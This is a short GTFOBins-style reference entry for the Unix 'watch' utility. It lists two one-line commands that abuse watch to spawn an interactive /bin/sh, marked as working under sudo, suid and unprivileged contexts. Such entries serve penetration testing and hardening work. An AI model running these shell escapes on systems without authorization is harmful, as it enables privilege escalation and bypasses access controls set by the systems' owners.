---
type: gtfobin
name: watch
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# watch

## shell

```bash
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```
**Contexts:** sudo, suid, unprivileged

```bash
watch 'reset; exec /bin/sh 1>&0 2>&0'
```
**Contexts:** sudo, suid, unprivileged
